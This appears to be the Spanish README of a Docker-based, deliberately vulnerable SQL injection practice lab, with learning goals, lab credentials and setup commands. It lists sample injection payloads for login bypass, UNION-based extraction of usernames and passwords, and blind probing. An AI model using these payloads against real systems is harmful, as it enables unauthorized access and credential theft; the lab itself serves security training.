
# 🎯 SQL Injection Lab

## Descripción
Laboratorio vulnerable diseñado para practicar técnicas de inyección SQL en un entorno seguro.

## Objetivos de Aprendizaje
- 🔍 Identificar puntos de inyección SQL
- 💉 Explotar vulnerabilidades UNION-based
- 📊 Extraer información de bases de datos
- 🛡️ Entender técnicas de bypass de filtros

## Acceso
- **URL**: http://localhost
- **Credenciales por defecto**: admin/password

## Escenarios Incluidos

### 1. SQL Injection Básico
```sql
' OR 1=1-- 
" OR 1=1-- 
admin'--
```

### 2. UNION-based SQL Injection
```sql
' UNION SELECT NULL,version(),database()-- 
' UNION SELECT username,password FROM users-- 
```

### 3. Blind SQL Injection
```sql
' AND (SELECT COUNT(*) FROM users)>0-- 
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- 
```

## Base de Datos
- **Motor**: MySQL 5.7
- **Puerto**: 3306
- **Usuario**: dvwa / p@ssw0rd
- **Root**: root / toor

## Comandos Útiles

### Iniciar laboratorio
```bash
docker-compose up -d
```

### Detener laboratorio
```bash
docker-compose down
```

### Reset completo
```bash
docker-compose down -v
docker-compose up -d
```

### Acceder a la base de datos
```bash
mysql -h localhost -u dvwa -p
```

## Soluciones
Las soluciones están disponibles en `solutions.md` tras completar los ejercicios.

---
**Desarrollado por @descambiado para BOFA**
